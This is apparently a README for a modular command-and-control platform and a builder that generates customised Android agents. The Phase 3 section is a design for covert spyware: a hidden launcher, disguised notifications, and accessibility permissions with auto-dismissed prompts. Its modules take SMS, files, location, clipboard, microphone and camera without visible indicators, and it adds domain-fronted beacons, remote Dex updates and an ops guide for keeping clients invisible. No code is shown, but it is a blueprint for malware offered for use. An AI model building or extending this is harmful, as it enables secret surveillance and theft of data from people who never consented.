## Platform Services

This directory contains the next-generation, modular architecture that will replace the legacy monolith. Each service is self-contained, can be deployed independently, and communicates over well-defined interfaces (REST/WebSocket/message bus).

### Services (initial set)

- `control-api`: Fastify-based HTTP API that exposes device management, operator auth, automation rules, and integration endpoints. Over time this service will be backed by PostgreSQL/Timescale and expose GraphQL alongside REST.
- `realtime-gateway`: (planned) Socket.IO/WebSocket entry point that brokers live channels between operators and managed clients.
- `builder-service`: (planned) Containerized pipeline for crafting customized Android (and future Windows/Linux) agents with obfuscation, signing, and telemetry toggles.

### Development Workflow

1. Install dependencies in the desired service directory (`npm install`).
2. Copy `.env.example` to `.env` and adjust ports/credentials.
3. Run `npm run dev` for iterative development, or `npm run build && npm start` for production mode.
4. For persistence, point `DATABASE_URL` to a PostgreSQL instance (Kysely + `pg` driver). When omitted, services such as `control-api` automatically fall back to in-memory repositories for rapid prototyping.
5. Use Docker/Compose (coming soon) to orchestrate shared services such as PostgreSQL, Redis, and MinIO.

### Roadmap Snapshot

| Phase | Focus | Notes |
| --- | --- | --- |
| 1 | Service scaffolding, RBAC-ready control API | Fastify, Zod, modular plugins |
| 2 | Device pipeline + analytics | PostgreSQL, queue workers, dashboards |
| 3 | Multi-platform agents & builder | Gradle-based Android client, Dex updater, Windows companion |
| 4 | Automation + integrations | Rule engine, webhook connectors, SIEM exports |

### Builder & Android Agent Strategy (Phase 3 Detail)

1. **Modern Android Project Setup**
   - Create a new Gradle project using AGP 8+ with Kotlin DSL, split into `core`, `stealth`, and `modules/*`.
   - Configure `minSdk 24`, `targetSdk 34`, leverage `WorkManager`/`ForegroundService` best practices and dynamic feature flags.
   - Build flavors: `stealth` (hidden launcher, restricted notifications) and `full` (debug/instrumentation).

2. **Stealth Guarantees**
   - Launcher activity disabled via `componentEnabledSetting`, binder entry kept internal.
   - Mandatory foreground services show an innocuous persistent notification; builder auto-generates localized text/icons to blend with OEM services.
   - Permission requests batched with onboarding scenarios (AccessibilityService, NotificationListener) and auto-dismiss UI surfaces when possible.
   - Network beacons throttled and randomized; all traffic over TLS with pinned certificates and optional domain fronting profile.

3. **Module System**
   - Each capability (SMS, files, GPS, clipboard, mic, camera-lite, sensors, beacon) lives in its own Gradle module implementing a `ClientModule` interface.
   - Builder can toggle modules at compile time; risky ones (camera/mic) wrapped with capability checks that ensure no visible indicators (e.g., only capture when accessibility overlay active or reuse existing recording notifications).
   - Future desktop agents share the same protocol definitions via a multiplatform `client-protocol` module.

4. **Update & Command Channel**
   - Implement a lightweight gRPC/WebSocket client with exponential backoff + randomized jitter.
   - Ship an update agent using `DexClassLoader` to fetch signed module patches without reinstalling the APK, keeping signature stealth.

5. **Builder Service**
   - Containerized node/Java image with the Gradle project mounted read-only.
   - Steps: fetch template → apply operator profile (icon, label, URLs, cert) → toggle modules → run Gradle assemble → sign & align → optional obfuscation (R8) → upload artifact to MinIO.
   - UI exposes profiles with “stealth score” (green/yellow/red) explaining which modules might surface indicators.

6. **Compliance & Telemetry**
   - All sensitive modules emit “stealth hints” back to the control API (e.g., mic requested -> confirm OS indicator state). Automations can disable modules remotely if risk thresholds exceeded.
   - Builder maintains manifest of included permissions/scopes so the panel can warn operators before deployment.

Deliverables for Phase 3 kickoff: Gradle skeleton repo, builder service Dockerfile + CLI, protocol spec, and ops guide describing how to keep clients invisible on Android 12–14.

All new code must be thoroughly linted/tested and ship with documentation so operators can gradually migrate off the legacy stack without downtime.

